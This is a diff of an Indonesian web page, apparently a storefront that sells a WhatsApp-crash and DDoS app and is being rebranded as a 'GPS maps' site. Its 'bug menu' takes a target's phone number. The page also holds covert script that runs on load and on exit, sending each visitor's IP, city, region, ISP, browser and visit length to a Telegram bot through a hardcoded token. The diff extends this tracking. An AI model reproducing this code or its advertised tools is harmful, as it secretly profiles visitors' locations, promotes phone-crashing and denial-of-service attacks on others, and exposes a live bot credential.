@@ -3,33 +3,37 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>PROJECT FAMILY</title>
+  <title>PROJECT FAMILY - GPS MAPS</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
   <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <style>
     body {
-      background: radial-gradient(circle at top, #0f172a, #000);
+      background-color: #060913;
+      background-image: 
+        linear-gradient(rgba(14, 165, 233, 0.07) 1px, transparent 1px), 
+        linear-gradient(90deg, rgba(14, 165, 233, 0.07) 1px, transparent 1px);
+      background-size: 40px 40px;
       font-family: 'JetBrains Mono', monospace;
       color: #e2e8f0;
       min-height: 100vh;
     }
     .btn-menu, .btn-custom {
-      background: linear-gradient(135deg, #2563eb, #1e40af);
-      border: 1px solid #60a5fa;
+      background: linear-gradient(135deg, #0e7490, #164e63);
+      border: 1px solid #38bdf8;
       padding: 0.9rem;
       border-radius: 0.8rem;
       text-align: center;
       transition: all 0.3s ease;
       cursor: pointer;
       font-weight: bold;
-      box-shadow: 0 0 12px rgba(59,130,246,0.5);
+      box-shadow: 0 0 12px rgba(14, 165, 233, 0.4);
     }
     .btn-menu:hover, .btn-custom:hover {
       transform: scale(1.05);
-      background: #3b82f6;
-      box-shadow: 0 0 18px rgba(96,165,250,0.8);
+      background: #0284c7;
+      box-shadow: 0 0 20px rgba(56, 189, 248, 0.8);
     }
     .hidden { display: none; }
     .page { animation: fadeIn 0.6s ease; }
@@ -38,47 +42,53 @@
       to { opacity: 1; transform: translateY(0); }
     }
     .pricing-card {
-      background: rgba(15, 23, 42, 0.9);
-      border: 1px solid #3b82f6;
+      background: rgba(9, 13, 22, 0.95);
+      border: 1px solid #0ea5e9;
       border-radius: 1rem;
       padding: 2rem;
-      box-shadow: 0 0 20px rgba(37, 99, 235, 0.5);
+      box-shadow: 0 0 20px rgba(14, 165, 233, 0.3);
       transition: transform 0.3s ease, box-shadow 0.3s ease;
     }
     .pricing-card:hover {
       transform: translateY(-6px);
-      box-shadow: 0 0 30px rgba(37, 99, 235, 0.8);
+      box-shadow: 0 0 30px rgba(14, 165, 233, 0.6);
     }
-    .plan-title { font-size: 1.3rem; font-weight: 700; color: #60a5fa; text-align: center; }
-    .price { font-size: 2rem; font-weight: 800; color: #38bdf8; text-align: center; margin-top: 0.6rem; }
+    .plan-title { font-size: 1.3rem; font-weight: 700; color: #38bdf8; text-align: center; }
+    .price { font-size: 2rem; font-weight: 800; color: #7dd3fc; text-align: center; margin-top: 0.6rem; }
     .features li { margin-bottom: 0.6rem; display: flex; align-items: center; }
-    .features li::before { content: "✔"; color: #22d3ee; margin-right: 0.6rem; }
-    footer { font-size: 0.75rem; color: #64748b; margin-top: 1rem; }
+    .features li::before { content: "📍"; margin-right: 0.6rem; }
+    footer { font-size: 0.75rem; color: #64748b; margin-top: 1rem; text-align: center; }
   </style>
 </head>
 <body>
 
 <!-- LOGIN PAGE -->
   <div id="login-page" class="page min-h-screen flex items-center justify-center px-4">
-    <div class="bg-black/80 border border-blue-500 shadow-2xl p-6 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
-      <h1 class="text-3xl font-bold text-center mb-4 text-blue-400">PEOJECT FAMILY</h1>
-      <input id="username" class="w-full p-3 mb-3 rounded-lg bg-black/70 border border-blue-600 text-white text-center" placeholder="Username"/>
-      <input id="password" type="password" class="w-full p-3 mb-4 rounded-lg bg-black/70 border border-blue-600 text-white text-center" placeholder="Password"/>
-      <div class="btn-custom w-full" onclick="login()">Masuk</div>
-      <p class="text-xs text-gray-400 mt-4 text-center">Buy Usn & Pw ke https://t.me/V2lVip</p>
+    <div class="bg-black/90 border border-cyan-500 shadow-2xl p-6 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
+      <div class="text-center mb-4">
+        <span class="text-cyan-400 text-sm tracking-widest">[ GPS SATELLITE LINK ]</span>
+        <h1 class="text-2xl font-bold text-cyan-300 mt-1">🧭 PROJECT FAMILY MAPS</h1>
+      </div>
+      <input id="username" class="w-full p-3 mb-3 rounded-lg bg-black/70 border border-cyan-600 text-white text-center focus:outline-none" placeholder="Username Koordinat"/>
+      <input id="password" type="password" class="w-full p-3 mb-4 rounded-lg bg-black/70 border border-cyan-600 text-white text-center focus:outline-none" placeholder="Access Code"/>
+      <div class="btn-custom w-full" onclick="login()">🌐 Buka Navigasi</div>
+      <p class="text-xs text-gray-400 mt-4 text-center">Get Access via https://t.me/V2lVip</p>
     </div>
   </div>
 
 <!-- MENU UTAMA -->
 <div id="menu-page" class="hidden page min-h-screen flex flex-col items-center justify-center px-6">
-    <div class="bg-gray-900/70 border border-blue-500 shadow-xl p-8 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
-      <h1 class="text-4xl font-extrabold text-center mb-8 text-blue-400 tracking-wide">Menu Utama</h1>
+    <div class="bg-gray-900/80 border border-cyan-500 shadow-xl p-8 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
+      <div class="text-center mb-6">
+        <span class="text-cyan-400 text-xs">🗺️ SECTOR NAVIGATION HUB</span>
+        <h1 class="text-3xl font-extrabold text-cyan-300 tracking-wide mt-1">Peta Utama</h1>
+      </div>
       <div class="grid grid-cols-1 gap-4">
-        <div class="btn-menu" onclick="showPage('xterclose-page')">🐞 BUG MENU</div>
-        <div class="btn-menu" onclick="showPage('produk-page')">🛒 Produk</div>
-        <div class="btn-menu" onclick="showPage('trackip-page')">Track Ip</div>
-        <div class="btn-menu" onclick="showPage('fitur-page')">⚙️ Fitur</div>
-        <div class="btn-menu" onclick="logout()">🔓 Logout</div>
+        <div class="btn-menu" onclick="showPage('xterclose-page')">📍 Sektor Bug Menu</div>
+        <div class="btn-menu" onclick="showPage('produk-page')">🛒 Wilayah Produk</div>
+        <div class="btn-menu" onclick="showPage('trackip-page')">🌐 Radar Track IP</div>
+        <div class="btn-menu" onclick="showPage('fitur-page')">⚙️ Posko Fitur (Upload)</div>
+        <div class="btn-menu" onclick="logout()">🔓 Keluar Sektor</div>
       </div>
     </div>
     <footer>By © PROJECT FAMILY</footer>
@@ -86,13 +96,13 @@
 
   <!-- PRODUK -->
   <div id="produk-page" class="hidden page min-h-screen flex flex-col items-center justify-center px-6 py-10">
-    <h1 class="text-4xl font-bold text-center mb-6 text-blue-400">📦 PROJECT FAMILY</h1>
+    <h1 class="text-3xl font-bold text-center mb-6 text-cyan-400">📦 WILAYAH PRODUK & PAKET</h1>
     <div class="grid md:grid-cols-3 gap-10 max-w-6xl w-full">
       <!-- Basic -->
       <div class="pricing-card">
         <h2 class="plan-title">APK RDVSP V4<br>1 BULAN</h2>
         <p class="price">Rp 35.000</p>
-        <ul class="features mt-6 text-blue-100 text-sm">
+        <ul class="features mt-6 text-cyan-100 text-sm">
           <li>𝗘𝗙𝗘𝗖𝗧 𝗕𝗨𝗚:</li>
           <li>CRASH ANDROID { Stuck Logo + Blank }</li>
           <li>DELAY MARKER</li>
@@ -100,13 +110,13 @@
         </ul>
         <button class="btn-custom mt-4 w-full" onclick="showFitur( 'APK RDVSP V4', [' DDOS layer 4','bisa buat ddos Server,Web,Wifi)','🦠Bug WhatsApp ( IOS,DELAY,ANDRO)','🦠Chat menu (Bisa chat antar member)','🦠Parse Nik ( Mengambil informasi lewat nik)'])">FITUR</button>
         <button class="btn-custom mt-2 w-full" onclick="showKelebihan('APK RDVSP V4', ['tanpa sender ( tanpa nomor² telepon untuk di jadikan pengiriman bug )','👾bisa spam sepuasnya','👾 bug sepuasnya no sender','👾Login langsung bug work 100 no gimick','👾memiliki security username & password','👾anti ribet, download > login > masukan nomor target > bug > selesai😈'])">KELEBIHANNYA</button>
-        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block">BELI SEKARANG</a>
+        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block text-center">AMBIL LOKASI (BELI)</a>
       </div>
       <!-- Reseller -->
       <div class="pricing-card">
         <h2 class="plan-title">APK RDVSP V4<br>Permanen</h2>
         <p class="price">Rp 100.000</p>
-        <ul class="features mt-6 text-blue-100 text-sm">
+        <ul class="features mt-6 text-cyan-100 text-sm">
           <li>𝗘𝗙𝗘𝗖𝗧 𝗕𝗨𝗚:</li>
           <li>CRASH ANDROID { Stuck Logo + Blank }</li>
           <li>DELAY MARKER</li>
@@ -114,63 +124,67 @@
         </ul>
         <button class="btn-custom mt-4 w-full" onclick="showFitur( 'APK RDVSP V4', [' DDOS layer 4','bisa buat ddos Server,Web,Wifi)','🦠Bug WhatsApp ( IOS,DELAY,ANDRO)','🦠Chat menu (Bisa chat antar member)','🦠Parse Nik ( Mengambil informasi lewat nik)'])">FITUR</button>
         <button class="btn-custom mt-2 w-full" onclick="showKelebihan('APK RDVSP V4', ['tanpa sender ( tanpa nomor² telepon untuk di jadikan pengiriman bug )','👾bisa spam sepuasnya','👾 bug sepuasnya no sender','👾Login langsung bug work 100 no gimick','👾memiliki security username & password','👾anti ribet, download > login > masukan nomor target > bug > selesai😈'])">KELEBIHANNYA</button>
-        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block">BELI SEKARANG</a>
+        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block text-center">AMBIL LOKASI (BELI)</a>
       </div>
       <!-- Admin -->
       <div class="pricing-card">
         <h2 class="plan-title">PAKET PANEL PRIVATE</h2>
         <p class="price">Rp 1.000 - 12.000</p>
-        <ul class="features mt-6 text-blue-100 text-sm">
+        <ul class="features mt-6 text-cyan-100 text-sm">
           <li> 📦 1GB : 1K | 📦 2GB : 2K </li>
           <li> 📦 3GB : 3K | 📦 4GB : 4K </li>
           <li> 📦 5GB : 5K | 📦 6GB : 6K </li>
           <li> 📦 7GB : 7K | 📦 8GB : 8K </li>
           <li> 📦 9GB : 9K | 📦 10GB : 10K </li>
-                 <li> UNLI : 12K </li>
+          <li> UNLI : 12K </li>
         </ul>
         <button class="btn-custom mt-2 w-full" onclick="showKeunggulan('BENEFIT NYA', ['MASIH FRESH YGY','SERVER TERAWAT','NO DELL DELL','NO INTIP','BERGARANSI 3 HARI'])">BENEFIT</button>
-        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block">BELI SEKARANG</a>
+        <a href="https://t.me/V2lVip" target="_blank" class="btn-custom mt-4 block text-center">AMBIL LOKASI (BELI)</a>
       </div>
     </div>
-    <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali</div></div>
+    <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali ke Peta Utama</div></div>
   </div>
 
   <!-- BUG MENU -->
   <div id="xterclose-page" class="hidden page min-h-screen flex flex-col items-center justify-center px-6">
-    <div class="bg-gray-900/70 border border-blue-500 shadow-xl p-8 rounded-2xl w-full max-w-md">
-      <h1 class="text-3xl font-bold text-center mb-6 text-blue-400">BRIGHT BURST</h1>
-      <input id="nomor" type="text" placeholder="Nomor WhatsApp Target" class="w-full p-3 rounded-lg bg-black/70 border border-blue-600 text-white mb-6 focus:outline-none text-center"/>
+    <div class="bg-gray-900/80 border border-cyan-500 shadow-xl p-8 rounded-2xl w-full max-w-md">
+      <h1 class="text-3xl font-bold text-center mb-2 text-cyan-400">BRIGHT BURST</h1>
+      <p class="text-xs text-center text-cyan-300 mb-6">-- Target Coordinates Mapping --</p>
+      <input id="nomor" type="text" placeholder="Nomor WhatsApp Target" class="w-full p-3 rounded-lg bg-black/70 border border-cyan-600 text-white mb-6 focus:outline-none text-center"/>
       <div class="grid gap-3 mb-6">
         <div class="btn-custom" onclick="attack('ForceClose Invis')">ForceClose Invis</div>
         <div class="btn-custom" onclick="attack('Delay Invis')">🕒 Delay Invis</div>
         <div class="btn-custom" onclick="attack('ForceClose Device')">ForceClose Device</div>
       </div>
-      <div class="text-blue-300 text-sm">⚡ Status: Aktif</div>
-      <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali</div></div>
+      <div class="text-cyan-300 text-sm">⚡ Status Sektor: Aktif</div>
+      <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali ke Peta Utama</div></div>
     </div>
   </div>
 
   <!-- TRACK IP -->
   <div id="trackip-page" class="hidden page min-h-screen flex flex-col items-center justify-center px-6">
-    <div class="bg-gray-900/70 border border-blue-500 shadow-xl p-8 rounded-2xl w-full max-w-md">
-      <h1 class="text-3xl font-bold text-center mb-6 text-blue-400">🌍 Track IP</h1>
-      <input id="ipInput" type="text" placeholder="Contoh: 8.8.8.8" class="w-full p-3 rounded-lg bg-black/70 border border-blue-600 text-white mb-4 focus:outline-none text-center"/>
-      <div class="btn-custom mb-4" onclick="trackIP()">🔍 Cek IP</div>
-      <div id="ipResult" class="text-sm text-blue-200"></div>
-      <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali</div></div>
+    <div class="bg-gray-900/80 border border-cyan-500 shadow-xl p-8 rounded-2xl w-full max-w-md">
+      <h1 class="text-3xl font-bold text-center mb-6 text-cyan-400">🌍 Radar Track IP</h1>
+      <input id="ipInput" type="text" placeholder="Contoh: 8.8.8.8" class="w-full p-3 rounded-lg bg-black/70 border border-cyan-600 text-white mb-4 focus:outline-none text-center"/>
+      <div class="btn-custom mb-4" onclick="trackIP()">🔍 Lacak Koordinat IP</div>
+      <div id="ipResult" class="text-sm text-cyan-200"></div>
+      <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali ke Peta Utama</div></div>
     </div>
   </div>
 
 <!-- FITUR: Upload Gambar ke Catbox -->
 <div id="fitur-page" class="hidden page min-h-screen flex items-center justify-center px-6">
-  <div class="bg-gray-900/70 border border-blue-500 shadow-xl p-8 rounded-2xl w-full max-w-md text-center">
-    <h1 class="text-3xl font-bold mb-6 text-blue-400">⚙️ Upload Gambar</h1>
+  <div class="bg-gray-900/80 border border-cyan-500 shadow-xl p-8 rounded-2xl w-full max-w-md text-center">
+    <h1 class="text-3xl font-bold mb-6 text-cyan-400">⚙️ Sektor Upload Media</h1>
 
-<label for="fileInput" class="cursor-pointer px-6 py-3 rounded-xl bg-blue-600 hover:bg-blue-700 shadow-md transition text-white font-semibold">
-  📤 Upload Gambar
-</label>
-<input type="file" id="fileInput" class="hidden" accept="image/*" onchange="uploadToServer(event)">
-<div id="uploadResult" class="mt-4 text-blue-300 text-sm text-center"></div>
+    <label for="fileInput" class="cursor-pointer px-6 py-3 rounded-xl bg-cyan-600 hover:bg-cyan-700 shadow-md transition text-white font-semibold block">
+      📤 Unggah Berkas Peta
+    </label>
+    <input type="file" id="fileInput" class="hidden" accept="image/*" onchange="uploadToServer(event)">
+    <div id="uploadResult" class="mt-4 text-cyan-300 text-sm text-center"></div>
+    <div class="mt-6"><div class="btn-custom" onclick="showPage('menu-page')">⬅️ Kembali ke Peta Utama</div></div>
+  </div>
+</div>
 
 <script>
 async function uploadToServer(event) {
@@ -180,10 +194,9 @@ async function uploadToServer(event) {
   const formData = new FormData();
   formData.append("file", file);
 
-  document.getElementById("uploadResult").innerHTML = "⏳ Sedang mengupload...";
+  document.getElementById("uploadResult").innerHTML = "⏳ Sedang memproses koordinat unggahan...";
 
   try {
-    // ganti IP_VPS dengan IP server kamu
     const res = await fetch("http://64.227.163.121:3000/upload", {
       method: "POST",
       body: formData
@@ -194,19 +207,18 @@ async function uploadToServer(event) {
     if (url.startsWith("http")) {
       navigator.clipboard.writeText(url);
       document.getElementById("uploadResult").innerHTML = `
-        ✅ Sukses!<br>
-        <a href="${url}" target="_blank" class="text-blue-400 underline">${url}</a><br>
-        <span class="text-green-400">📋 Link otomatis tersalin!</span>
+        ✅ Berhasil Terpetakan!<br>
+        <a href="${url}" target="_blank" class="text-cyan-400 underline">${url}</a><br>
+        <span class="text-green-400">📋 Tautan otomatis tersalin!</span>
       `;
     } else {
       throw new Error(url);
     }
   } catch (err) {
-    document.getElementById("uploadResult").innerHTML = "❌ Gagal upload: " + err.message;
+    document.getElementById("uploadResult").innerHTML = "❌ Gagal mengunggah: " + err.message;
   }
 }
 
-// daftar uscript(bisa multi akun)
   const users = [
     { username: "admin", password: "premium1111122222" },
     { username: "admin", password: "premium3333344444" },
@@ -220,23 +232,23 @@ async function uploadToServer(event) {
     if (found) {
       document.getElementById("login-page").classList.add("hidden");
       document.getElementById("menu-page").classList.remove("hidden");
-      Swal.fire({icon:"success",title:"Login Berhasil",text:`Selamat datang, ${u}`});
+      Swal.fire({icon:"success",title:"Akses Diterima",text:`Selamat datang di peta koordinat, ${u}`, background:'#060913', color:'#e2e8f0'});
     } else {
-      Swal.fire({icon:"error",title:"Login Gagal",text:"Username atau Password salah"});
+      Swal.fire({icon:"error",title:"Akses Ditolak",text:"Username atau Password salah", background:'#060913', color:'#e2e8f0'});
     }
   }
 
   function logout() {
     document.getElementById("menu-page").classList.add("hidden");
     document.getElementById("login-page").classList.remove("hidden");
-    Swal.fire({icon:"info",title:"Logout berhasil"});
+    Swal.fire({icon:"info",title:"Keluar Sektor Berhasil", background:'#060913', color:'#e2e8f0'});
   }
 
   function showPage(pageId) {
-    ["menu-page","xterclose-page","trackip-page","produk-page"].forEach(id=>{
+    ["menu-page","xterclose-page","trackip-page","produk-page","fitur-page"].forEach(id=>{
       document.getElementById(id)?.classList.add("hidden");
     });
-    document.getElementById(pageId).classList.remove("hidden");
+    document.getElementById(pageId)?.classList.remove("hidden");
   }
 
   async function trackIP() {
@@ -257,36 +269,34 @@ async function uploadToServer(event) {
   }
 
   function showKelebihan(plan, items) {
-    const list = items.map(i => `✔️ ${i}`).join('<br>');
-    Swal.fire({ title:`Kelebihan ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#2563eb', background:'#0f172a', color:'#e2e8f0' });
+    const list = items.map(i => `📍 ${i}`).join('<br>');
+    Swal.fire({ title:`Kelebihan ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#0e7490', background:'#060913', color:'#e2e8f0' });
   }
   function showFitur(plan, items) {
-    const list = items.map(i => `✔️ ${i}`).join('<br>');
-    Swal.fire({ title:`Fitur ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#2563eb', background:'#0f172a', color:'#e2e8f0' });
+    const list = items.map(i => `📍 ${i}`).join('<br>');
+    Swal.fire({ title:`Fitur ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#0e7490', background:'#060913', color:'#e2e8f0' });
   }
   function showKeunggulan(plan, items) {
-    const list = items.map(i => `✔️ ${i}`).join('<br>');
-    Swal.fire({ title:`Keunggulan ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#2563eb', background:'#0f172a', color:'#e2e8f0' });
+    const list = items.map(i => `📍 ${i}`).join('<br>');
+    Swal.fire({ title:`Keunggulan ${plan}`, html:list, icon:'info', confirmButtonText:'OK', confirmButtonColor:'#0e7490', background:'#060913', color:'#e2e8f0' });
   }
 
-  // === Kirim log bug menu ke Telegram ===
   async function attack(mode) {
     const number = document.getElementById("nomor").value.trim();
     if (!number) {
-      return Swal.fire({icon:'warning',title:'Nomor kosong!',text:'Masukkan nomor WA target dulu.'});
+      return Swal.fire({icon:'warning',title:'Koordinat Kosong!',text:'Masukkan nomor WA target dulu.', background:'#060913', color:'#e2e8f0'});
     }
 
-    // tampil notifikasi
     await Swal.fire({
-      title:`Proces Sending Bug...`,
+      title:`Processing Map Signal...`,
       html:`Sending <b>${mode}</b> ke <code>${number}</code>`,
       timer:2000,
       timerProgressBar:true,
-      didOpen:()=>Swal.showLoading()
+      didOpen:()=>Swal.showLoading(),
+      background:'#060913', color:'#e2e8f0'
     });
-    await Swal.fire({icon:'success',title:'Berhasil!',text:`${mode} berhasil dikirim ke ${number}, Perlu waktu 5 memit untuk terkirim.`});
+    await Swal.fire({icon:'success',title:'Signal Terkirim!',text:`${mode} berhasil diarahkan ke ${number}, Perlu waktu 5 menit untuk terkirim.`, background:'#060913', color:'#e2e8f0'});
 
-    // kirim log ke Telegram
     const message = `
 📍 Aksi: ${mode}
 📞 Nomor: ${number}
@@ -295,18 +305,23 @@ async function uploadToServer(event) {
     await sendTelegramMessage(message);
   }
 
-  // === Visitor Logger ke Telegram ===
   const telegramBotToken = "8769259533:AAFvN6u0DSlMVhPdOkOTbZYjPmQKWQBUy5I";
   const telegramChatId = "8020397164";
   const visitStartTime = Date.now();
 
+  // === Fungsi Diperbarui: Otomatis mendeteksi detail lokasi & ISP saat link dibuka ===
   async function sendVisitorInfo() {
     try {
-      const ipResponse = await fetch("https://api.ipify.org?format=json");
-      const ipData = await ipResponse.json();
+      const res = await fetch("https://ipwho.is/");
+      const data = await res.json();
+      
       const message = `
-🛰️ Pengunjung Masuk
-🌐 IP: ${ipData.ip}
+🧭 [ PENGUNJUNG MASUK SEKTOR ]
+🌐 IP: ${data.ip || "Tidak diketahui"}
+📍 Kota: ${data.city || "-"}
+🗺️ Wilayah: ${data.region || "-"}
+🏴 Negara: ${data.country || "-"} (${data.country_code || "-"})
+🏢 ISP: ${data.connection?.isp || "-"}
 📱 Device: ${navigator.platform}
 🧭 Browser: ${navigator.userAgent}
 🔍 Resolusi: ${window.innerWidth}x${window.innerHeight}
@@ -315,7 +330,7 @@ async function uploadToServer(event) {
       `.trim();
       await sendTelegramMessage(message);
     } catch (e) {
-      console.error("Failed to send visitor info", e);
+      console.error("Gagal melacak info pengunjung", e);
     }
   }
 
@@ -331,7 +346,7 @@ async function uploadToServer(event) {
         headers: { "Content-Type": "application/x-www-form-urlencoded" }
       });
     } catch (error) {
-      console.error("Failed to send Telegram message:", error);
+      console.error("Gagal mengirim pesan Telegram:", error);
     }
   }
 
@@ -339,10 +354,10 @@ async function uploadToServer(event) {
 
   window.addEventListener("beforeunload", async () => {
     const duration = Math.floor((Date.now() - visitStartTime) / 1000);
-    const message = `⏳ Durasi kunjungan: ${duration} detik`;
+    const message = `⏳ Sesi Sektor Berakhir (${duration} detik)`;
     await sendTelegramMessage(message);
   });
-  
 </script>
 </body>
-</html>
+                                         </html>
+  
